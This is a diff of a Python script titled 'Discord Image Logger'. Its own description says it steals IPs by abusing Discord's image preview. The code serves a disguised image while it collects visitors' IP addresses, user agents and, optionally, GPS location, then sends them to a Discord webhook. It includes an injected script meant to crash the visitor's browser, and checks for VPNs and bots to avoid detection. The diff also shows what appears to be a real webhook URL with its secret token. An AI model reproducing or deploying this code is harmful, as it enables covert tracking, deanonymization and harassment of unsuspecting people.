@@ -1,9 +1,20 @@
-config = {Add commentMore actions
+
+# Discord Image LoggerAdd commentMore actions
+# By DeKrypt | https://github.com/dekrypted
+
+from http.server import BaseHTTPRequestHandler
+from urllib import parse
+import traceback, requests, base64, httpagentparser
+
+__app__ = "Discord Image Logger"
+__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
+__version__ = "v2.0"
+__author__ = "DeKrypt"
+
+config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
     "webhook": "https://discord.com/api/webhooks/1382260360366522393/4npBZU9yjEwJxtcFN2g-WEUHOdlg9ZhkQBKB13S2Zlw2sOkQqed4mmByFizQ95mMrszy",
-    "image": "https://www.elternguide.online/wp-content/uploads/2019/03/fry-password-1.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -13,7 +24,7 @@ config = {Add commentMore actions
 
     # OPTIONS #
     "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
-
+    
     "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
@@ -36,7 +47,7 @@ config = {Add commentMore actions
                 # 2 = Don't ping when it's 100% a bot
                 # 3 = Don't send an alert when it's possibly a bot
                 # 4 = Don't send an alert when it's 100% a bot
-
+    
 
     # REDIRECTION #
     "redirect": {
@@ -80,9 +91,9 @@ def reportError(error):
 def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
     if ip.startswith(blacklistedIPs):
         return
-
+    
     bot = botCheck(ip, useragent)
-
+    
     if bot:
         requests.post(config["webhook"], json = {
     "username": config["username"],
@@ -103,10 +114,10 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     if info["proxy"]:
         if config["vpnCheck"] == 2:
                 return
-
+        
         if config["vpnCheck"] == 1:
             ping = ""
-
+    
     if info["hosting"]:
         if config["antiBot"] == 4:
             if info["proxy"]:
@@ -128,7 +139,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 
 
     os, browser = httpagentparser.simple_detect(useragent)
-
+    
     embed = {
     "username": config["username"],
     "content": ping,
@@ -164,7 +175,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     }
   ],
 }
-
+    
     if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
     requests.post(config["webhook"], json = embed)
     return info
@@ -177,7 +188,7 @@ binaries = {
 }
 
 class ImageLoggerAPI(BaseHTTPRequestHandler):
-
+    
     def handleRequest(self):
         try:
             if config["imageArgument"]:
@@ -202,10 +213,10 @@ background-size: contain;
 width: 100vw;
 height: 100vh;
 }}</style><div class="img"></div>'''.encode()
-
+            
             if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                 return
-
+            
             if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                 self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                 self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
@@ -214,9 +225,9 @@ height: 100vh;
                 if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.
 
                 makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
-
+                
                 return
-
+            
             else:
                 s = self.path
                 dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
@@ -226,7 +237,7 @@ height: 100vh;
                     result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                 else:
                     result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
-
+                
 
                 message = config["message"]["message"]
 
@@ -250,7 +261,7 @@ height: 100vh;
 
                 if config["message"]["doMessage"]:
                     data = message.encode()
-
+                
                 if config["crashBrowser"]:
                     data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher
 
@@ -277,7 +288,7 @@ if (!currenturl.includes("g=")) {
 
 </script>"""
                 self.wfile.write(data)
-
+        
         except Exception:
             self.send_response(500)
             self.send_header('Content-type', 'text/html')
@@ -287,7 +298,7 @@ if (!currenturl.includes("g=")) {
             reportError(traceback.format_exc())
 
         return
-
+    
     do_GET = handleRequest
     do_POST = handleRequest
 
